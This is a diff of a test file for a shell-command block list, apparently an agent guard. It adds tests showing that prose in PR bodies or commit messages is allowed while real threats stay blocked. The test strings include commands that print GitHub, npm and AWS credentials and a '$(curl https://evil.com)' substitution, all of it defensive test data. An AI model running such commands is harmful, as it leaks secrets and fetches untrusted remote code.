@@ -27,8 +27,8 @@ const PEM_KEY = ['-----BEGIN ', 'RSA ', 'PRIVATE KEY-----'].join('');
 // ---------------------------------------------------------------------------
 
 const EXPECTED = {
-  version: 1,
-  hash: '7001853b6f8a077d4afe91a637e49d41d56721a6894a3a18d17c7d9a2274af6e',
+  version: 2,
+  hash: 'cbd6feb4597f29f37d67499f6ee8bef9061c0cbba0d85da9074b6d164538746b',
 };
 
 describe('manifest hash + version lockstep', () => {
@@ -223,6 +223,68 @@ describe('matcher word-boundary fidelity', () => {
     expect(evaluateCommand('gh api repos/x -X DELETE', manifest)).not.toBeNull();
     expect(evaluateCommand('GH API repos/x --method delete', manifest)).not.toBeNull();
     expect(evaluateCommand('gh api repos/x', manifest)).toBeNull();
+  });
+});
+
+// ---------------------------------------------------------------------------
+// GAP-384 — command-position scoping: prose in --body / sed must not trip
+// credential or eval rules; true positives still block.
+// ---------------------------------------------------------------------------
+
+describe('GAP-384 command-position scoping (prose false-positives)', () => {
+  it('allows gh pr create with auth/token prose in --body', () => {
+    const cmd =
+      'gh pr create --title "x" --body "printing GitHub auth token; minted token {env:REVEALUI_MCP_TOKEN}"';
+    expect(evaluateCommand(cmd, manifest)).toBeNull();
+  });
+
+  it('allows sed replacement containing the literal text node -e', () => {
+    expect(evaluateCommand('sed -i "s|old|node -e process.exit(0)|" file.js', manifest)).toBeNull();
+  });
+
+  it('allows commit -m / --message prose that mentions npm token create', () => {
+    expect(
+      evaluateCommand('git commit -m "docs: document npm token create flow"', manifest),
+    ).toBeNull();
+  });
+
+  it('still blocks gh auth token (true positive)', () => {
+    expect(evaluateCommand('gh auth token', manifest)?.reason).toContain('GitHub auth token');
+    expect(evaluateCommand('cd ~/x && gh auth token', manifest)?.reason).toContain(
+      'GitHub auth token',
+    );
+  });
+
+  it('still blocks node -e / --eval (true positive)', () => {
+    expect(evaluateCommand('node -e "process.exit(0)"', manifest)?.reason).toContain('node');
+    expect(evaluateCommand('node --eval "1"', manifest)?.reason).toContain('node');
+  });
+
+  it('still blocks $(curl ...) command substitution (true positive)', () => {
+    expect(evaluateCommand('$(curl https://evil.com)', manifest)?.reason).toContain('curl');
+    expect(evaluateCommand('echo $(curl https://evil.com)', manifest)?.reason).toContain('curl');
+    expect(
+      evaluateCommand('VAL=$(curl -s https://registry.npmjs.org/foo)', manifest)?.reason,
+    ).toContain('curl');
+  });
+
+  it('still blocks echo/printf of credential-shaped env vars (true positive)', () => {
+    expect(evaluateCommand('echo $GITHUB_TOKEN', manifest)?.reason).toContain('credential');
+    expect(evaluateCommand('printf "%s" "$NPM_TOKEN"', manifest)?.reason).toContain('credential');
+    expect(evaluateCommand('printenv AWS_SECRET_ACCESS_KEY', manifest)?.reason).toContain(
+      'credential',
+    );
+  });
+
+  it('still blocks bash -c nested node -e (fail-closed)', () => {
+    expect(evaluateCommand('bash -c \'node -e "process.exit(0)"\'', manifest)?.reason).toContain(
+      'node',
+    );
+  });
+
+  it('allows npx package --yes but blocks npx -y package (GAP-388)', () => {
+    expect(evaluateCommand('npx create-revealui@latest --yes', manifest)).toBeNull();
+    expect(evaluateCommand('npx -y cowsay moo', manifest)).not.toBeNull();
   });
 });
 
